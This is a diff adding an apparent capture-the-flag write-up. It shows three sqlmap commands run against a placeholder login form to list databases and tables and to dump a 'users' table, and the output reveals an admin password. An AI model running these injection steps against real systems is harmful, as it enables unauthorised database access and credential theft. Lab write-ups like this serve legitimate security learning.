@@ -1,0 +1,42 @@
+#1 To know which tables are exist and available
+``` 
+sqlmap -u "http://<IP-Target>/login" --data="username=admin&password=admin" --batch --dbs
+```
+
+Result: 
+available databases [2]:
+[*] information_schema
+[*] sqhell_2
+
+
+#2 Check sqhell_2 tables 
+
+```
+sqlmap -u "http://<IP-Target>/login" --data="username=admin&password=admin" -D sqhell_2 --tables --batch
+```
+
+Result:
+
+adjusting time delay to 3 seconds due to good response times
+users
+Database: sqhell_2
+[1 table]
++-------+
+| users |
++-------+
+
+#3 Lets see what is the inside 'users' table
+
+```
+sqlmap -u "http://<IP_TARGET>/login" --data"=username=admin&password=admin" -D sqhell_2 -T users --dump --batch
+```
+
+Database: sqhell_2
+Table: users
+[1 entry]
++----+---------------------------------+----------+
+| id | password                        | username |
++----+---------------------------------+----------+
+| 1  | icantrememberthispasswordcanyou | admin    |
++----+---------------------------------+----------+
+
